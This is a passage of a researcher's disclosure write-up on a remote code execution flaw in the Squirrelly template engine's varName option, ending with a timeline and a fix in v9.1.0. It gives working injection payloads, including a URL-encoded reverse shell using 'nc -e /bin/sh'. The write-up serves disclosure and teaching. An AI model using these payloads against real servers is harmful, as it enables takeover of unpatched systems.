    compileScope(buffer, env) +
    'if(cb){cb(null,tR)} return tR' +
    (env.useWith ? '}' : '')
```

(`env` is the `options` parameter passed to the `render` function)

After following the complete function call chain (`render -> handleCache -> compile -> compileString`), I found that the
`env.varName` parameter is indeed not sanitized. At first glance, this seems like an easy way to inject arbitrary JS and
get RCE server-side. In order to get this exploit to work, the attacker should set `env.useWith` so that `env.varName`
is injected.

The `with` expression is an almost-deprecated Javascript feature that allows you to execute a block of code, appending
an object to the global scope chain. This is demonstrated below:

```
with ("asdf") {
    console.log(toString()) // logs "asdf"
}
```

However, what is important is that we can inject an arbitrary expression into the `with` argument. This can easily allow
us to get RCE! A simple payload would be:

```
// options.varName = 'console.log("x")'
with (console.log("x") || {}) {
    // ...
}
```

This should execute the `console.log("x")` statement and give us RCE.

## Testing

We can set up a simple server to test this out.

```
const express = require("express")

const PORT = 3000

const app = express()
app.set("view engine", "squirrelly")

app.get("/", (req, res) => {
  res.render("asdf", req.query)
})

app.listen(3000, () => {
  console.log(`Server is running at port ${PORT}`)
})
```

Visiting the following URL to execute our payload:

```
http://localhost:3000?useWith=1&varName=console.log("x")
```

However, if we try to do this, we get the following error:

```
Squirrelly Error: Bad template syntax

Arg string terminates parameters early
======================================
var tR='';tR+='asdf\n';if(cb){cb(null,tR)} return tR
    at SqrlErr (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:138:15)
    at compile (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:881:19)
    at handleCache (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1002:12)
    at tryHandleCache (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1035:13)
    at View.renderFile [as engine] (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1064:12)
    at View.render (/home/samuzora/test/node_modules/express/lib/view.js:135:8)
    at tryRender (/home/samuzora/test/node_modules/express/lib/application.js:657:10)
    at Function.render (/home/samuzora/test/node_modules/express/lib/application.js:609:3)
    at ServerResponse.render (/home/samuzora/test/node_modules/express/lib/response.js:1048:7)
    at /home/samuzora/test/index.js:9:7
```

What does this mean? Searching for the error message, we can see the error being raised at
[`src/compile.ts:44`](https://github.com/squirrellyjs/squirrelly/blob/5eae86154a03d0716c2525ab9e50d9adb318abe6/src/compile.ts#L44):

```
  try {
    return new ctor(
      options.varName,
      'c', // SqrlConfig
      'cb', // optional callback
      compileToString(str, options)
    ) as TemplateFunction // eslint-disable-line no-new-func
  } catch (e) {
    if (e instanceof SyntaxError) {
      throw SqrlErr(
        'Bad template syntax\n\n' +
          e.message +
          '\n' +
          Array(e.message.length + 1).join('=') +
          '\n' +
          compileToString(str, options)
      )
  } else {
      throw e
  }
```

The `options.varName` parameter is being passed to the `ctor` function (which is just a `Function` constructor). The
`Function` constructor takes in `n+1` arguments, where the first `n` arguments are parameters of the function to be
created, and the last argument is the function body. That’s what’s causing our error, since we’re passing
`console.log("x")` into the parameter field. This means our injection occurs in the first parameter of the new function
being created, and should be a valid JS expression that can be passed in a parameter declaration. And our payload should
still execute as per normal in the `with` expression.

## First payload

Javascript allows for parameters to be destructured in the function definition like so:

```
function f({ a }) {
    console.log(a)
    // ...
}
```

This is done through object destructuring. It’s quite flexible and also allows for default values to be set:

```
function f({ a = 1 }) {
    console.log(a)
}
```

This is the vector for our RCE. When setting the default value, the expression has to be evaluated, which we can use for
RCE. Something like this should work:

```
function f({ a = console.log("x") }) {
    console.log(a)
}
```

However, there’s a small problem - our payload is also being injected in the `with` expression, and this syntax is
invalid there since it’s not a valid object initializer.

```
with ({ a = console.log("x") } || {}) {
    // ...
}
```

Indeed, when we try this payload, it crashes as well:

```
Squirrelly Error: Bad template syntax

Invalid shorthand property initializer
======================================
var tR='';with({a=console.log("X")}||{}){tR+='asdf\n';if(cb){cb(null,tR)} return tR}
    at SqrlErr (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:138:15)
    at compile (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:881:19)
    at handleCache (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1002:12)
    at tryHandleCache (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1035:13)
    at View.renderFile [as engine] (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1064:12)
    at View.render (/home/samuzora/test/node_modules/express/lib/view.js:135:8)
    at tryRender (/home/samuzora/test/node_modules/express/lib/application.js:657:10)
    at Function.render (/home/samuzora/test/node_modules/express/lib/application.js:609:3)
    at ServerResponse.render (/home/samuzora/test/node_modules/express/lib/response.js:1048:7)
    at /home/samuzora/test/index.js:9:7
```

Luckily, according to the
[docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment), the destructuring syntax is quite flexible and allows for a lot more kinds of syntax:

```
const [a, b] = array;
const [a, , b] = array;
const [a = aDefault, b] = array;
const [a, b, ...rest] = array;
const [a, , b, ...rest] = array;
const [a, b, ...{ pop, push }] = array;
const [a, b, ...[c, d]] = array;

const { a, b } = obj;
const { a: a1, b: b1 } = obj;
const { a: a1 = aDefault, b = bDefault } = obj;
const { a, b, ...rest } = obj;
const { a: a1, b: b1, ...rest } = obj;
const { [key]: a } = obj;

let a, b, a1, b1, c, d, rest, pop, push;
[a, b] = array;
[a, , b] = array;
[a = aDefault, b] = array;
[a, b, ...rest] = array;
[a, , b, ...rest] = array;
[a, b, ...{ pop, push }] = array;
[a, b, ...[c, d]] = array;

({ a, b } = obj); // parentheses are required
({ a: a1, b: b1 } = obj);
({ a: a1 = aDefault, b = bDefault } = obj);
({ a, b, ...rest } = obj);
({ a: a1, b: b1, ...rest } = obj);
```

The most interesting syntax is this:

```
({ a: a1 = aDefault, b = bDefault } = obj);
```

It takes the value corresponding to the `a1` key in `obj`, and assigns it to `a`. If `a1` is not defined then it
evaluates `aDefault`

With this syntax, we can satisfy the `with` expression since it’s now a valid object initializer. It also satisfies the
`Function` constructor since it’s simply assigning the value to a different name. So we can use this for RCE!

```
// valid!
with ({ a: b = console.log("x") } || {}) {
    // ...
}

// valid!
new Function("{ a: b = console.log('x') }", "c", "cb", "return 1")
```

Let’s test out our payload with a reverse shell:

```
Payload: { a: b = global.process.mainModule.require("child_process").execSync("nc -e /bin/sh localhost 1337") }

http://localhost:3000?useWith=1&varName=%7B%20a:%20b%20=%20global.process.mainModule.require(%22child_process%22).execSync(%22nc%20-e%20/bin/sh%20localhost%201337%22)%20%7D
```

And we have RCE!

![Reverse shell](/_astro/reverse-shell.CgYCXD0F_17mfRh.webp)

## Better payloads

In the process of writing the report, I realized that there are easier payloads that can be used:

```
[ a = console.log("x") ]
```

This payload is valid in both the `with` expression and the `Function` constructor.

```
// don't set useWith=1
{ a = console.log("x") }
```

With this payload, we can just bypass the `with` expression entirely, and just inject the payload into the `Function`
constructor.

# Timeline

Note: When I first requested the CVE ID, I put my Gmail as the contact email, but didn’t receive any response. I’m
pretty sure that Gmail is blocking emails from `mitre.org` which can’t be disabled, so I re-requested the CVE with
Outlook.

* *First discovery*: 28 May 2024
* *Reported to maintainer Ben Gubler*: 28 May 2024
* *CVE ID requested*: 30 May 2024
* *CVE ID re-requested*: 1 Jul 2024
* *Fix merged*: 2 Jul 2024
* *CVE ID assigned*: 17 Jul 2024
* *Public disclosure*: 18 Jul 2024
* *CVE published*: 22 Aug 2024

## Remediation

The vulnerability has been patched in v9.1.0.

    [Pug v3.0.2 RCE (CVE-2024-36361)](/posts/cve-2024-36361)   [GreyCTF Finals 2024](/posts/grey-finals-2024)
samuzora © 2021 - 2024

